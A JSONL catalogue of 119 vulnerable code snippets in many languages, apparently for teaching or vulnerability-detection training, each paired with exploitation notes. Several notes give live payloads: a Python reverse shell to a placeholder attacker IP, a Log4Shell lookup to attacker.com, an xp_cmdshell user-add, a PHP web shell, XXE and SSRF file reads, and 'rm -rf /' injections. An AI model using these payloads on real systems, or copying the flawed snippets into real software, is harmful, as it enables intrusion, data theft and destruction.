{"id": "vuln-001", "language": "Node.js", "vulnerability_type": "SQL Injection", "code_snippet": "const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});", "exploitation_techniques": "Inject malicious SQL like ' OR '1'='1 to bypass authentication. Use tools like SQLMap for automated exploitation.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-002", "language": "Node.js", "vulnerability_type": "Command Injection", "code_snippet": "const { exec } = require('child_process'); exec(`ping ${req.query.host}`, (err, stdout) => {...});", "exploitation_techniques": "Append commands like ; rm -rf / to input. Exploit via web requests or fuzzing tools like Burp Suite.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-003", "language": "Python", "vulnerability_type": "SQL Injection", "code_snippet": "cursor.execute(f\"SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'\")", "exploitation_techniques": "Input payloads like ' OR 1=1-- to extract data. Automate with sqlmap or custom scripts.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-004", "language": "Python", "vulnerability_type": "OS Command Injection", "code_snippet": "import subprocess; subprocess.call(f\"ping {request.args.get('host')}\", shell=True)", "exploitation_techniques": "Inject ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")' for reverse shell.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-005", "language": "Java", "vulnerability_type": "SQL Injection", "code_snippet": "String query = \"SELECT * FROM users WHERE username = '\" + request.getParameter(\"username\") + \"' AND password = '\" + request.getParameter(\"password\") + \"'\"; stmt.executeQuery(query);", "exploitation_techniques": "Use ' UNION SELECT database()-- to leak info. Chain with JDBC exploits.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-006", "language": "Java", "vulnerability_type": "XXE (XML External Entity)", "code_snippet": "DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));", "exploitation_techniques": "Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> and reference &xxe; to read files.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-007", "language": "PHP", "vulnerability_type": "SQL Injection", "code_snippet": "$query = \"SELECT * FROM users WHERE username = '\" . $_POST['username'] . \"' AND password = '\" . $_POST['password'] . \"'\"; mysqli_query($conn, $query);", "exploitation_techniques": "Payload: ' OR SLEEP(5)-- for time-based blind injection. Use Havij or manual burp intercepts.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-008", "language": "PHP", "vulnerability_type": "File Inclusion", "code_snippet": "include($_GET['page'] . '.php');", "exploitation_techniques": "Append ?page=../../../etc/passwd%00 for LFI. For RFI, use remote URLs if allow_url_include=on.", "cwe_category": "Access & Authorization"}
{"id": "vuln-009", "language": "Ruby", "vulnerability_type": "SQL Injection", "code_snippet": "User.where(\"username = '#{params[:username]}' AND password = '#{params[:password]}'\")", "exploitation_techniques": "Input: '); DROP TABLE users;-- to destroy data. Exploit via Rails console or web forms.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-010", "language": "Ruby", "vulnerability_type": "Command Injection", "code_snippet": "system(\"ping #{params[:host]}\")", "exploitation_techniques": "Inject ; rm -rf / for destruction. Chain commands for shell access.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-011", "language": "Go", "vulnerability_type": "SQL Injection", "code_snippet": "query := fmt.Sprintf(\"SELECT * FROM users WHERE username = '%s' AND password = '%s'\", r.FormValue(\"username\"), r.FormValue(\"password\")); db.Query(query)", "exploitation_techniques": "Payload: ' OR '1'='1 to login bypass. Use go-sql-driver exploits.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-012", "language": "Go", "vulnerability_type": "Path Traversal", "code_snippet": "http.HandleFunc(\"/file\", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(\"file\"); data, _ := ioutil.ReadFile(file); ... })", "exploitation_techniques": "Query ?file=../../../etc/passwd to read sensitive files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-013", "language": "C# (.NET)", "vulnerability_type": "SQL Injection", "code_snippet": "string query = \"SELECT * FROM users WHERE username = '\" + Request.Form[\"username\"] + \"' AND password = '\" + Request.Form[\"password\"] + \"'\"; SqlCommand cmd = new SqlCommand(query);", "exploitation_techniques": "Input: '; EXEC xp_cmdshell('net user hacker pass /add')-- for command exec.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-014", "language": "C# (.NET)", "vulnerability_type": "LDAP Injection", "code_snippet": "string filter = \"(uid=\" + username + \")\"; DirectorySearcher searcher = new DirectorySearcher(filter);", "exploitation_techniques": "Input: *)(uid=*))(|(uid=* to bypass filters and enumerate users.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-015", "language": "Node.js", "vulnerability_type": "NoSQL Injection", "code_snippet": "const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);", "exploitation_techniques": "Input JSON like {\"$ne\": null} for username to bypass checks. Use NoSQLMap for automation.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-016", "language": "Node.js", "vulnerability_type": "SSRF", "code_snippet": "const url = req.query.url; axios.get(url).then(res => {...});", "exploitation_techniques": "Request internal IPs like http://169.254.169.254/latest/meta-data/ for cloud metadata. Chain with DNS rebinding.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-017", "language": "Python", "vulnerability_type": "Deserialization", "code_snippet": "import pickle; data = request.data; obj = pickle.loads(data);", "exploitation_techniques": "Craft malicious pickle with __reduce__ to exec os.system('rm -rf /'). Use ysoserial equivalents.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-018", "language": "Python", "vulnerability_type": "Path Traversal", "code_snippet": "filename = request.args.get('file'); with open(filename, 'r') as f: ...", "exploitation_techniques": "Input ../etc/passwd to read files. Traverse to /proc/self/environ for env vars.", "cwe_category": "Access & Authorization"}
{"id": "vuln-019", "language": "Java", "vulnerability_type": "Deserialization", "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();", "exploitation_techniques": "Use ysoserial CommonsCollections for RCE. Chain gadgets for command exec.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-020", "language": "Java", "vulnerability_type": "LDAP Injection", "code_snippet": "String filter = \"(cn=\" + userInput + \")\"; ldapCtx.search(\"\", filter, controls);", "exploitation_techniques": "Input *)(|(objectClass=*) to enumerate. Bypass auth with )(uid=*.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-021", "language": "PHP", "vulnerability_type": "XXE", "code_snippet": "$xml = simplexml_load_string($input);", "exploitation_techniques": "Inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> &xxe; for file read.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-022", "language": "PHP", "vulnerability_type": "Unrestricted File Upload", "code_snippet": "move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);", "exploitation_techniques": "Upload .php with <?php system($_GET['cmd']); ?> and access for RCE.", "cwe_category": "Access & Authorization"}
{"id": "vuln-023", "language": "Ruby", "vulnerability_type": "Deserialization", "code_snippet": "obj = Marshal.load(input);", "exploitation_techniques": "Craft payload with _dump to exec system calls. Use Ruby equivalents of ysoserial.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-024", "language": "Ruby", "vulnerability_type": "SSRF", "code_snippet": "require 'open-uri'; URI.open(params[:url]).read;", "exploitation_techniques": "file:///etc/passwd or http://127.0.0.1/admin for local access.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-025", "language": "Go", "vulnerability_type": "Deserialization", "code_snippet": "dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);", "exploitation_techniques": "Exploit type mismatches or large allocations for DoS. Limited RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-026", "language": "Go", "vulnerability_type": "SSRF", "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"));", "exploitation_techniques": "http://localhost:8080/secret or gopher:// for protocol abuse.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-027", "language": "C# (.NET)", "vulnerability_type": "Deserialization", "code_snippet": "BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);", "exploitation_techniques": "Ysoserial.Net payloads like TextFormattingRunProperties for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-028", "language": "C# (.NET)", "vulnerability_type": "XXE", "code_snippet": "XmlReader reader = XmlReader.Create(new StringReader(xml));", "exploitation_techniques": "XXE payload for file:/C:/Windows/win.ini read.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-029", "language": "Node.js", "vulnerability_type": "Prototype Pollution", "code_snippet": "function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);", "exploitation_techniques": "Input {\"__proto__\": {\"admin\": true}} to alter behavior.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-030", "language": "Node.js", "vulnerability_type": "JWT None Algorithm", "code_snippet": "jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });", "exploitation_techniques": "Change alg to none and remove signature for bypass.", "cwe_category": "Session & Token Management"}
{"id": "vuln-031", "language": "Python", "vulnerability_type": "SSRF", "code_snippet": "import requests; requests.get(request.args.get('url'))", "exploitation_techniques": "dict://localhost:6379/info for port scanning.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-032", "language": "Python", "vulnerability_type": "Template Injection", "code_snippet": "from jinja2 import Template; Template(user_input).render();", "exploitation_techniques": "{{ config.items() }} for config dump. Escalate to RCE with __globals__.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-033", "language": "Java", "vulnerability_type": "SSRF", "code_snippet": "URL url = new URL(request.getParameter(\"url\")); url.openConnection();", "exploitation_techniques": "jar:file:///etc/passwd!/ for file read.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-034", "language": "Java", "vulnerability_type": "Log4Shell", "code_snippet": "logger.error(userInput); // with log4j < 2.15", "exploitation_techniques": "${jndi:ldap://attacker.com/a} for RCE.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-035", "language": "PHP", "vulnerability_type": "Deserialization", "code_snippet": "unserialize($_COOKIE['data']);", "exploitation_techniques": "PHPGGC payloads for __destruct RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-036", "language": "PHP", "vulnerability_type": "SSRF", "code_snippet": "$ch = curl_init($_GET['url']); curl_exec($ch);", "exploitation_techniques": "gopher://127.0.0.1:6379/_%0d%0aSET%20key%20val for Redis attack.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-037", "language": "Ruby", "vulnerability_type": "YAML Deserialization", "code_snippet": "YAML.load(input);", "exploitation_techniques": "!ruby/object:Gem::Installer { :i: !ruby/object:Gem::SpecFetcher { :f: !ruby/object:Gem::Installer { :i: !ruby/object:Gem::Requirement { requirements: !ruby/object:Gem::Package::TarReader { io: !ruby/object:Net::BufferedIO { io: !ruby/object:Gem::Package::TarReader::Entry { read: 0, header: \"foo\" } } } } } } for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-038", "language": "Ruby", "vulnerability_type": "Path Traversal", "code_snippet": "File.open(params[:file]).read", "exploitation_techniques": "../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-039", "language": "Go", "vulnerability_type": "Template Injection", "code_snippet": "t, _ := template.New(\"\").Parse(userInput); t.Execute(w, data);", "exploitation_techniques": "{{ .OS }} or range to access env.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-040", "language": "Go", "vulnerability_type": "Insecure Randomness", "code_snippet": "import \"math/rand\"; token := rand.Intn(1000000);", "exploitation_techniques": "Predict seeds based on time for token guessing.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-041", "language": "C# (.NET)", "vulnerability_type": "SSRF", "code_snippet": "new WebClient().DownloadString(Request.QueryString[\"url\"]);", "exploitation_techniques": "file:///C:/inetpub/wwwroot/web.config", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-042", "language": "C# (.NET)", "vulnerability_type": "Insecure Deserialization (JSON)", "code_snippet": "new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);", "exploitation_techniques": "Payloads for ProcessStartInfo RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-043", "language": "Kotlin", "vulnerability_type": "SQL Injection", "code_snippet": "val query = \"SELECT * FROM users WHERE name = '${request.params[\"name\"]}'\"; db.rawQuery(query)", "exploitation_techniques": "' OR 1=1--", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-044", "language": "Kotlin", "vulnerability_type": "Deserialization", "code_snippet": "val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject()", "exploitation_techniques": "Similar to Java ysoserial.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-045", "language": "Scala", "vulnerability_type": "Command Injection", "code_snippet": "import sys.process._; s\"ping $host\".!", "exploitation_techniques": "; rm -rf /", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-046", "language": "Scala", "vulnerability_type": "XXE", "code_snippet": "XML.loadString(xml)", "exploitation_techniques": "Standard XXE payloads.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-047", "language": "Rust", "vulnerability_type": "Command Injection", "code_snippet": "use std::process::Command; Command::new(\"sh\").arg(\"-c\").arg(&input).output();", "exploitation_techniques": "ls; rm -rf /", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-048", "language": "Rust", "vulnerability_type": "Path Traversal", "code_snippet": "let path = Path::new(&input); fs::read_to_string(path);", "exploitation_techniques": "../../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-049", "language": "Elixir", "vulnerability_type": "SQL Injection", "code_snippet": "Repo.query(\"SELECT * FROM users WHERE name = '#{name}'\")", "exploitation_techniques": "' OR 1=1", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-050", "language": "Elixir", "vulnerability_type": "Command Injection", "code_snippet": "System.cmd(\"ping\", [host])", "exploitation_techniques": "If shell: ping; rm", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-051", "language": "Perl", "vulnerability_type": "SQL Injection", "code_snippet": "$dbh->do(\"SELECT * FROM users WHERE name = '$name'\");", "exploitation_techniques": "' OR 1=1--", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-052", "language": "Perl", "vulnerability_type": "Command Injection", "code_snippet": "system(\"ping $host\");", "exploitation_techniques": "; rm -rf /", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-053", "language": "Node.js", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "/^([a-zA-Z0-9]+)*$/.test(input);", "exploitation_techniques": "Input aaaaaaaaaaaaaaaaaaaaaaaaa! for backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-054", "language": "Python", "vulnerability_type": "Insecure Eval", "code_snippet": "eval(request.args.get('expr'))", "exploitation_techniques": "__import__('os').system('rm -rf /')", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-055", "language": "Java", "vulnerability_type": "Insecure Random", "code_snippet": "Random rand = new Random(); int token = rand.nextInt();", "exploitation_techniques": "Predict based on seed.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-056", "language": "PHP", "vulnerability_type": "Insecure Eval", "code_snippet": "eval($_GET['code']);", "exploitation_techniques": "system('rm -rf /');", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-057", "language": "Ruby", "vulnerability_type": "Insecure Eval", "code_snippet": "eval(params[:code])", "exploitation_techniques": "system('rm -rf /')", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-058", "language": "Go", "vulnerability_type": "Race Condition", "code_snippet": "if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }", "exploitation_techniques": "TOCTOU: symlink during check and create.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-059", "language": "C# (.NET)", "vulnerability_type": "Insecure Random", "code_snippet": "Random rand = new Random(); int token = rand.Next();", "exploitation_techniques": "Predictable sequences.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-060", "language": "Node.js", "vulnerability_type": "CORS Misconfiguration", "code_snippet": "app.use(cors({ origin: '*' }));", "exploitation_techniques": "CSRF from malicious sites.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-061", "language": "Python", "vulnerability_type": "CORS Misconfig", "code_snippet": "CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})", "exploitation_techniques": "Cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-062", "language": "Java", "vulnerability_type": "IDOR", "code_snippet": "User user = em.find(User.class, request.getParameter(\"id\"));", "exploitation_techniques": "Change id to access others' data.", "cwe_category": "Access & Authorization"}
{"id": "vuln-063", "language": "PHP", "vulnerability_type": "IDOR", "code_snippet": "$id = $_GET['id']; $user = $db->query(\"SELECT * FROM users WHERE id = $id\");", "exploitation_techniques": "Increment IDs to leak.", "cwe_category": "Access & Authorization"}
{"id": "vuln-064", "language": "Ruby", "vulnerability_type": "Mass Assignment", "code_snippet": "User.create(params[:user])", "exploitation_techniques": "Add admin: true in params.", "cwe_category": "Access & Authorization"}
{"id": "vuln-065", "language": "Go", "vulnerability_type": "IDOR", "code_snippet": "id := r.URL.Query().Get(\"id\"); db.GetUser(id);", "exploitation_techniques": "Guess IDs.", "cwe_category": "Access & Authorization"}
{"id": "vuln-066", "language": "C# (.NET)", "vulnerability_type": "IDOR", "code_snippet": "var user = db.Users.Find(Request.Query[\"id\"]);", "exploitation_techniques": "Modify ID.", "cwe_category": "Access & Authorization"}
{"id": "vuln-067", "language": "Kotlin", "vulnerability_type": "SSRF", "code_snippet": "val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();", "exploitation_techniques": "Internal URLs.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-068", "language": "Scala", "vulnerability_type": "Deserialization", "code_snippet": "Similar to Java ObjectInputStream.", "exploitation_techniques": "Ysoserial.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-069", "language": "Rust", "vulnerability_type": "SQL Injection", "code_snippet": "conn.execute(&format!(\"SELECT * FROM users WHERE name = '{name}'\"), []);", "exploitation_techniques": "' OR 1=1", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-070", "language": "Elixir", "vulnerability_type": "Deserialization", "code_snippet": ":erlang.binary_to_term(input)", "exploitation_techniques": "Craft terms for code exec.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-071", "language": "Perl", "vulnerability_type": "XXE", "code_snippet": "XMLin($xml);", "exploitation_techniques": "XXE payload.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-072", "language": "Node.js", "vulnerability_type": "Zip Slip", "code_snippet": "adm-zip extracts to paths with ../", "exploitation_techniques": "Zip with ../files to overwrite.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-073", "language": "Python", "vulnerability_type": "Zip Slip", "code_snippet": "with zipfile.ZipFile(file) as z: z.extractall();", "exploitation_techniques": "Malicious zip with ../", "cwe_category": "Application Logic & Others"}
{"id": "vuln-074", "language": "Java", "vulnerability_type": "Zip Slip", "code_snippet": "Extract to entry.getName()", "exploitation_techniques": "../ in entry name.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-075", "language": "PHP", "vulnerability_type": "Zip Slip", "code_snippet": "$zip->extractTo('/path/');", "exploitation_techniques": "../ in filenames.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-076", "language": "Ruby", "vulnerability_type": "Zip Slip", "code_snippet": "Zip::File.open(file) { |z| z.each { |e| e.extract } }", "exploitation_techniques": "../ paths.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-077", "language": "Go", "vulnerability_type": "Zip Slip", "code_snippet": "r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }", "exploitation_techniques": "../ in f.Name", "cwe_category": "Application Logic & Others"}
{"id": "vuln-078", "language": "C# (.NET)", "vulnerability_type": "Zip Slip", "code_snippet": "ZipFile.ExtractToDirectory(zipPath, extractPath);", "exploitation_techniques": "../ entries.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-079", "language": "Node.js", "vulnerability_type": "GraphQL Depth Limit", "code_snippet": "apollo-server without depthLimit", "exploitation_techniques": "Nested queries for DoS.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-080", "language": "Python", "vulnerability_type": "GraphQL Injection", "code_snippet": "graphql with raw SQL in resolver.", "exploitation_techniques": "Injection in variables.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-081", "language": "Java", "vulnerability_type": "Insecure Session Handling", "code_snippet": "String sessionId = UUID.randomUUID().toString(); response.sendRedirect(\"page?sessionId=\" + sessionId);", "exploitation_techniques": "Sniff URLs for session IDs or brute-force predictable IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-082", "language": "Java", "vulnerability_type": "Broken Authentication", "code_snippet": "String password = request.getParameter(\"password\"); em.persist(new User(username, password));", "exploitation_techniques": "Dump database to access plaintext passwords.", "cwe_category": "Access & Authorization"}
{"id": "vuln-083", "language": "PHP", "vulnerability_type": "Session Fixation", "code_snippet": "session_start(); $_SESSION['user'] = $username;", "exploitation_techniques": "Provide malicious session ID via URL, hijack post-login.", "cwe_category": "Session & Token Management"}
{"id": "vuln-084", "language": "PHP", "vulnerability_type": "Insecure Direct Object Reference", "code_snippet": "$id = $_GET['id']; $file = file_get_contents(\"files/$id.pdf\");", "exploitation_techniques": "Guess IDs to access unauthorized files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-085", "language": "Python", "vulnerability_type": "Insecure Session Cookies", "code_snippet": "response.set_cookie('session', session_id);", "exploitation_techniques": "XSS to steal cookies or MITM for HTTP cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-086", "language": "Python", "vulnerability_type": "Hardcoded Credentials", "code_snippet": "db.connect(user='admin', password='p@ssw0rd')", "exploitation_techniques": "Code review or repo leak to extract creds.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-087", "language": "Node.js", "vulnerability_type": "Insecure File Upload", "code_snippet": "fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);", "exploitation_techniques": "Upload shell.js with malicious code, execute via endpoint.", "cwe_category": "Access & Authorization"}
{"id": "vuln-088", "language": "Node.js", "vulnerability_type": "Directory Traversal", "code_snippet": "fs.readFileSync(path.join('public', req.query.file));", "exploitation_techniques": "Input ../../etc/passwd to read files.", "cwe_category": "Access & Authorization"}
{"id": "vuln-089", "language": "Ruby", "vulnerability_type": "Insecure Session Storage", "code_snippet": "session[:user_data] = { ssn: params[:ssn] }", "exploitation_techniques": "Steal session to access sensitive data.", "cwe_category": "Session & Token Management"}
{"id": "vuln-090", "language": "Ruby", "vulnerability_type": "Insecure Redirect", "code_snippet": "redirect_to params[:url]", "exploitation_techniques": "Redirect to malicious site: ?url=http://evil.com", "cwe_category": "Access & Authorization"}
{"id": "vuln-091", "language": "Go", "vulnerability_type": "Insecure Cookies", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: id})", "exploitation_techniques": "MITM or XSS to steal cookies.", "cwe_category": "Session & Token Management"}
{"id": "vuln-092", "language": "Go", "vulnerability_type": "Hardcoded Secrets", "code_snippet": "client := NewClient(\"sk_1234567890\")", "exploitation_techniques": "Extract from repo or binary.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-093", "language": "C# (.NET)", "vulnerability_type": "Insecure File Access", "code_snippet": "string path = Request.Query[\"file\"]; File.ReadAllText(path);", "exploitation_techniques": "Access C:\\Windows\\system32\\config\\sam", "cwe_category": "Access & Authorization"}
{"id": "vuln-094", "language": "C# (.NET)", "vulnerability_type": "Hardcoded Credentials", "code_snippet": "var conn = new SqlConnection(\"user=sa;password=secret\");", "exploitation_techniques": "Extract from decompiled code.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-095", "language": "Kotlin", "vulnerability_type": "Insecure File Access", "code_snippet": "val file = File(request.params[\"file\"]).readText()", "exploitation_techniques": "../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-096", "language": "Kotlin", "vulnerability_type": "Hardcoded Secrets", "code_snippet": "val api = ApiClient(\"key-12345\")", "exploitation_techniques": "Decompile APK or source leak.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-097", "language": "Scala", "vulnerability_type": "Insecure Session", "code_snippet": "session.put(\"user\", username)", "exploitation_techniques": "Session fixation via shared IDs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-098", "language": "Scala", "vulnerability_type": "SQL Injection", "code_snippet": "db.run(sql\"SELECT * FROM users WHERE name = ${params(\"name\")}\")", "exploitation_techniques": "' OR 1=1--", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-099", "language": "Rust", "vulnerability_type": "Hardcoded Secrets", "code_snippet": "let client = Client::new(\"api_key_123\");", "exploitation_techniques": "Extract from binary or repo.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-100", "language": "Rust", "vulnerability_type": "Insecure File Access", "code_snippet": "fs::read_to_string(&req.path).unwrap()", "exploitation_techniques": "../../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-101", "language": "Elixir", "vulnerability_type": "Insecure Redirect", "code_snippet": "redirect conn, external: params[:url]", "exploitation_techniques": "Redirect to http://malicious.com", "cwe_category": "Access & Authorization"}
{"id": "vuln-102", "language": "Elixir", "vulnerability_type": "Hardcoded Secrets", "code_snippet": "config :app, key: \"secret123\"", "exploitation_techniques": "Source code exposure.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-103", "language": "Perl", "vulnerability_type": "Insecure File Access", "code_snippet": "open(my $fh, '<', $filename);", "exploitation_techniques": "../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-104", "language": "Perl", "vulnerability_type": "Hardcoded Credentials", "code_snippet": "my $dbh = DBI->connect(\"dbi:mysql:db\", \"root\", \"pass123\");", "exploitation_techniques": "Extract via source leak.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-105", "language": "Node.js", "vulnerability_type": "Insecure Password Storage", "code_snippet": "db.insert({ username, password: req.body.password });", "exploitation_techniques": "Dump DB to access passwords.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-106", "language": "Node.js", "vulnerability_type": "Insecure Randomness", "code_snippet": "const token = Math.random().toString(36);", "exploitation_techniques": "Predictable tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-107", "language": "Python", "vulnerability_type": "Insecure Randomness", "code_snippet": "import random; token = random.randint(100000, 999999)", "exploitation_techniques": "Predict based on seed.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-108", "language": "Java", "vulnerability_type": "Insecure File Upload", "code_snippet": "Files.copy(file.getInputStream(), Paths.get(\"uploads/\" + file.getName()));", "exploitation_techniques": "Upload malicious.jar or .jsp.", "cwe_category": "Access & Authorization"}
{"id": "vuln-109", "language": "PHP", "vulnerability_type": "Insecure Randomness", "code_snippet": "$token = rand(100000, 999999);", "exploitation_techniques": "Predictable output.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-110", "language": "Ruby", "vulnerability_type": "Insecure File Upload", "code_snippet": "File.write(\"uploads/#{params[:file].original_filename}\", params[:file].read)", "exploitation_techniques": "Upload malicious.rb.", "cwe_category": "Access & Authorization"}
{"id": "vuln-111", "language": "Go", "vulnerability_type": "Insecure File Upload", "code_snippet": "os.WriteFile(\"uploads/\"+r.FormValue(\"file\"), data, 0644)", "exploitation_techniques": "Upload executable .go.", "cwe_category": "Access & Authorization"}
{"id": "vuln-112", "language": "C# (.NET)", "vulnerability_type": "Insecure Randomness", "code_snippet": "Random rand = new Random(); string token = rand.Next().ToString();", "exploitation_techniques": "Predictable tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-113", "language": "Kotlin", "vulnerability_type": "Insecure Randomness", "code_snippet": "val token = Random().nextInt(100000, 999999).toString()", "exploitation_techniques": "Predictable sequence.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-114", "language": "Scala", "vulnerability_type": "Insecure Randomness", "code_snippet": "val token = scala.util.Random.nextInt(1000000)", "exploitation_techniques": "Predictable tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-115", "language": "Rust", "vulnerability_type": "Insecure Randomness", "code_snippet": "use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);", "exploitation_techniques": "Predictable output.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-116", "language": "Elixir", "vulnerability_type": "Insecure Randomness", "code_snippet": "token = :rand.uniform(1000000)", "exploitation_techniques": "Predictable sequence.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-117", "language": "Perl", "vulnerability_type": "Insecure Randomness", "code_snippet": "my $token = int(rand(1000000));", "exploitation_techniques": "Predictable tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-118", "language": "Node.js", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "app.post('/login', (req, res) => {...});", "exploitation_techniques": "Brute force passwords.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-119", "language": "Python", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "@app.route('/login', methods=['POST']) def login(): ...", "exploitation_techniques": "Automate login attempts.", "cwe_category": "Application Logic & Others"}
